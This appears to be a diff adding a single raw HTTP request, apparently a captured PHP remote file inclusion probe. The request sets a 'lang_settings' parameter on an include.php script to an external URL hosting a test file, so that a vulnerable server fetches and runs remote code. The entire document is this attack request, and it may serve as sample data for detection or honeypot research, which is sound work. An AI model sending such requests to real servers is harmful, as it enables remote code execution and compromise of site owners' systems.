@@ -1,0 +1,6 @@
+GET /accounts/inc/include.php?language=0&lang_settings[0][1]=http://ships.ifrance.com/webs/vulntest.txt? HTTP/1.0
+User-Agent: Wget/1.10.2
+Accept: */*
+Host: 217.160.223.74:32000
+Connection: Keep-Alive
+
